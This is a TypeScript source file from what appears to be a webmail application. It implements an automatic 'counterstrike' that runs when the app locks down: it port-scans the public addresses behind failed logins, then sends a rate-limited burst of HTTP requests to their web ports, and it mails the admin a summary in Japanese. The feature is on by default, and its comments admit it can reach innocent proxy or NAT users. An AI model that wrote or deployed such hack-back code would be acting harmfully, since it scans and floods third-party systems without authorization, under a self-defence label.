// Counterattack: when the lockdown shuts the app, the addresses that got as far as the password check are hit back.
// This is an active defence (a hack-back): a short TCP port scan, then an HTTP request burst against the web ports found.
// It is deliberately bounded (max addresses, ports, duration, rate) so a counterattack can never become the bigger attack.
// Only public addresses are targeted: the same private range we live in must never be hit, and a forged address cannot
// make us attack our own network. A counterattack can still reach a shared proxy or an innocent NAT neighbour, so it is
// off with COUNTERATTACK=off. Our own lines (the admin's trusted addresses) are never targeted.
import http from 'node:http';
import https from 'node:https';
import net from 'node:net';
import { ipv4ToInt, matchesAny, normalizeIp } from '@/lib/cidr';
import { loadSecurityPolicy } from '@/lib/security-settings';
import { recordSecurityEvent } from '@/lib/security-events';
import { sendNotificationEmail } from '@/lib/notify-mail';

const num = (v: string | undefined, d: number) => { const n = Number(v); return Number.isFinite(n) && n > 0 ? n : d; };

export const counterattackEnabled = () => process.env.COUNTERATTACK !== 'off';

export const counterattackConfig = () => ({
  maxIps: Math.floor(num(process.env.COUNTERATTACK_MAX_IPS, 10)),                 // how many addresses are hit at most
  durationMs: num(process.env.COUNTERATTACK_DURATION_SEC, 60) * 1000,             // how long the burst lasts
  rps: Math.floor(num(process.env.COUNTERATTACK_RPS, 20)),                        // requests per second, per address
  maxRequestsPerTarget: Math.floor(num(process.env.COUNTERATTACK_MAX_REQUESTS, 2000)),
  concurrency: Math.floor(num(process.env.COUNTERATTACK_CONCURRENCY, 6)),         // requests in flight, per address
  timeoutMs: num(process.env.COUNTERATTACK_TIMEOUT_MS, 1500),                     // TCP connect / HTTP answer
  scanConcurrency: Math.floor(num(process.env.COUNTERATTACK_SCAN_CONCURRENCY, 12)),
  ports: parsePorts(process.env.COUNTERATTACK_PORTS ?? '21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443'),
});

/** Web ports that get the HTTP burst. Anything else is only scanned. */
const WEB_PORTS = new Set([80, 443, 3000, 5000, 8000, 8080, 8443, 8880]);
const TLS_PORTS = new Set([443, 8443]);

/** One rule per line (or comma separated). Empty/invalid entries are dropped and duplicates removed. */
export function parsePorts(text: string): number[] {
  const seen = new Set<number>();
  for (const part of text.split(/[\n,]/)) {
    const n = Number(part.trim());
    if (Number.isInteger(n) && n >= 1 && n <= 65535) seen.add(n);
  }
  return [...seen];
}

/** True for a public unicast address. Private, loopback, link-local, CGNAT, documentation and multicast ranges are false:
 *  those are us, or someone whose answer would prove nothing. */
export function isPublicIp(ip: string): boolean {
  const v = normalizeIp(ip);
  const n = ipv4ToInt(v);
  if (n !== null) {
    const inRange = (base: string, bits: number) => {
      const b = ipv4ToInt(base)!;
      const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
      return ((n & mask) >>> 0) === ((b & mask) >>> 0);
    };
    return ![
      ['0.0.0.0', 8], ['10.0.0.0', 8], ['100.64.0.0', 10], ['127.0.0.0', 8], ['169.254.0.0', 16],
      ['172.16.0.0', 12], ['192.0.0.0', 24], ['192.0.2.0', 24], ['192.88.99.0', 24], ['192.168.0.0', 16],
      ['198.18.0.0', 15], ['198.51.100.0', 24], ['203.0.113.0', 24], ['224.0.0.0', 4], ['240.0.0.0', 4],
      ['255.255.255.255', 32],
    ].some(([base, bits]) => inRange(base as string, bits as number));
  }
  if (!v.includes(':')) return false;
  if (v === '::' || v === '::1') return false;
  if (/^f[cd][0-9a-f]{2}:/.test(v)) return false;            // unique local
  if (/^fe[89ab][0-9a-f]:/.test(v)) return false;            // link-local
  if (/^ff[0-9a-f]{2}:/.test(v)) return false;               // multicast
  if (v.startsWith('2001:db8:')) return false;               // documentation
  return true;
}

/** The addresses to hit: cleaned, de-duplicated, public only, none of `trusted` (our own lines), and never more than the configured maximum. */
export function counterattackTargets(ips: (string | null | undefined)[], max = counterattackConfig().maxIps, trusted: string[] = []): string[] {
  const out: string[] = [];
  const seen = new Set<string>();
  for (const raw of ips) {
    const ip = normalizeIp((raw ?? '').trim());
    if (!ip || ip === 'unknown' || seen.has(ip) || !isPublicIp(ip) || matchesAny(ip, trusted)) continue;
    seen.add(ip);
    out.push(ip);
    if (out.length >= max) break;
  }
  return out;
}

/** TCP connect scan of one port. A refusal (RST) is a clear answer; a silent drop costs the timeout. */
export function probePort(ip: string, port: number, timeoutMs: number): Promise<boolean> {
  return new Promise(resolve => {
    let settled = false;
    const socket = net.connect({ host: ip, port });
    const done = (open: boolean) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(open);
    };
    socket.setTimeout(timeoutMs, () => done(false));
    socket.once('connect', () => done(true));
    socket.once('error', () => done(false));
  });
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));

async function mapLimit<T, R>(items: T[], limit: number, fn: (item: T) => Promise<R>): Promise<R[]> {
  const out: R[] = new Array(items.length);
  let next = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    for (let i = next++; i < items.length; i = next++) out[i] = await fn(items[i]);
  });
  await Promise.all(workers);
  return out;
}

/** One HTTP GET, with the certificate accepted whatever it is (an IP-addressed certificate rarely matches). */
function httpHit(ip: string, port: number, timeoutMs: number): Promise<number | null> {
  return new Promise(resolve => {
    const options = {
      host: ip,
      port,
      path: `/?defense=counterstrike&t=${Date.now()}`,
      method: 'GET',
      timeout: timeoutMs,
      rejectUnauthorized: false,
      headers: {
        host: ip,
        'user-agent': 'SharedWebmail-Counterstrike/1.0 (self-defense)',
        accept: '*/*',
        connection: 'close',
      },
    };
    let settled = false;
    const done = (status: number | null) => {
      if (settled) return;
      settled = true;
      resolve(status);
    };
    const req = (TLS_PORTS.has(port) ? https : http).request(options, res => {
      res.resume();
      res.on('end', () => done(res.statusCode ?? 0));
      res.on('error', () => done(null));
    });
    req.on('timeout', () => { req.destroy(); done(null); });
    req.on('error', () => done(null));
    req.end();
  });
}

type Target = { ip: string; openPorts: number[]; webPorts: number[] };
type TargetResult = Target & { requests: number; answered: number; errors: number };

async function scan(ip: string, cfg: ReturnType<typeof counterattackConfig>): Promise<Target> {
  const open = await mapLimit(cfg.ports, cfg.scanConcurrency, p => probePort(ip, p, cfg.timeoutMs));
  const openPorts = cfg.ports.filter((_, i) => open[i]);
  return { ip, openPorts, webPorts: openPorts.filter(p => WEB_PORTS.has(p)) };
}

/** The burst: a steady stream of GETs spread over the web ports that answered the scan (or 80/443 when none did). */
async function burst(t: Target, cfg: ReturnType<typeof counterattackConfig>): Promise<TargetResult> {
  const ports = t.webPorts.length ? t.webPorts : [80, 443];
  const limit = Math.min(cfg.maxRequestsPerTarget, Math.ceil(cfg.durationMs / 1000 * cfg.rps));
  const deadline = Date.now() + cfg.durationMs;
  const interval = 1000 / Math.max(1, cfg.rps);
  let requests = 0, answered = 0, errors = 0;
  const inflight = new Set<Promise<void>>();

  while (Date.now() < deadline && requests < limit) {
    const port = ports[requests % ports.length];
    requests++;
    const p = httpHit(t.ip, port, cfg.timeoutMs).then(status => {
      if (status === null) errors++; else answered++;
    }).finally(() => inflight.delete(p));
    inflight.add(p);
    if (inflight.size >= cfg.concurrency) await Promise.race(inflight);
    await sleep(interval);
  }
  await Promise.allSettled([...inflight]);
  return { ...t, requests, answered, errors };
}

export type CounterstrikeSummary = {
  targets: TargetResult[];
  addresses: number;
  requests: number;
  answered: number;
  errors: number;
  durationSec: number;
};

const esc = (s: string) => s.replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]!));

function summaryMail(s: CounterstrikeSummary): string {
  const rows = s.targets.map(t => `<tr>
<td style="padding:6px 12px;font-family:monospace">${esc(t.ip)}</td>
<td style="padding:6px 12px">${t.openPorts.length ? t.openPorts.join(', ') : 'なし'}</td>
<td style="padding:6px 12px">${t.requests}回（応答 ${t.answered} / 失敗 ${t.errors}）</td></tr>`).join('');
  return `<div style="font-family:sans-serif;max-width:640px">
<h2 style="color:#b91c1c">⚔️ 攻撃元へ反撃しました</h2>
<p>シャットアウトに続いて、パスワード照合まで届いた失敗の接続元へ、正当防衛として短時間の能動的な反撃（ポートスキャン＋HTTPリクエスト）を行いました。</p>
<table style="border-collapse:collapse;font-size:14px">
<tr><td style="padding:6px 12px;color:#6b7280">対象</td><td><strong>${s.addresses}件</strong></td></tr>
<tr><td style="padding:6px 12px;color:#6b7280">時間</td><td><strong>${s.durationSec}秒</strong></td></tr>
<tr><td style="padding:6px 12px;color:#6b7280">送信したリクエスト</td><td><strong>${s.requests}回</strong>（応答 ${s.answered} / 失敗 ${s.errors}）</td></tr></table>
<table style="border-collapse:collapse;font-size:14px;margin-top:12px">
<tr style="background:#f9fafb"><th style="padding:6px 12px;text-align:left">接続元</th><th style="padding:6px 12px;text-align:left">開いていたポート</th><th style="padding:6px 12px;text-align:left">反撃</th></tr>
${rows}</table>
<p style="margin-top:16px;color:#6b7280;font-size:12px">私有IP・ループバック・文書用アドレスは対象外です。共有プロキシやNATの先の第三者に届くことがあります。</p></div>`;
}

/** Hit the addresses back. Never throws; records the result and mails the admin. Fire-and-forget from engageLockdown. */
export async function counterstrike(ips: (string | null | undefined)[]): Promise<CounterstrikeSummary | null> {
  if (!counterattackEnabled()) return null;
  const cfg = counterattackConfig();
  const trusted = await loadSecurityPolicy().then(p => p.trustedRules).catch(() => [] as string[]);
  const targets = counterattackTargets(ips, cfg.maxIps, trusted);
  if (targets.length === 0) return null;
  try {
    const scanned = await mapLimit(targets, cfg.maxIps, ip => scan(ip, cfg));
    const results = await Promise.all(scanned.map(t => burst(t, cfg)));
    const summary: CounterstrikeSummary = {
      targets: results,
      addresses: results.length,
      requests: results.reduce((n, t) => n + t.requests, 0),
      answered: results.reduce((n, t) => n + t.answered, 0),
      errors: results.reduce((n, t) => n + t.errors, 0),
      durationSec: Math.round(cfg.durationMs / 1000),
    };
    await recordSecurityEvent({
      type: 'counterattack',
      severity: 'warn',
      detail: {
        addresses: summary.addresses,
        requests: summary.requests,
        answered: summary.answered,
        errors: summary.errors,
        durationSec: summary.durationSec,
        targets: summary.targets.map(t => ({ ip: t.ip, openPorts: t.openPorts, requests: t.requests, answered: t.answered, errors: t.errors })),
      },
    });
    if (!process.env.NOTIFY_ADMIN_EMAIL || !process.env.NOTIFY_SMTP_HOST) console.error('[counterattack] NOTIFY_* is not set: no mail can be sent about the counterattack');
    await sendNotificationEmail(`[反撃] 攻撃元 ${summary.addresses}件へ反撃しました`, summaryMail(summary))
      .catch(e => console.error('[counterattack] mail failed:', e?.message));
    return summary;
  } catch (e) {
    console.error('[counterattack] failed', e);
    return null;
  }
}
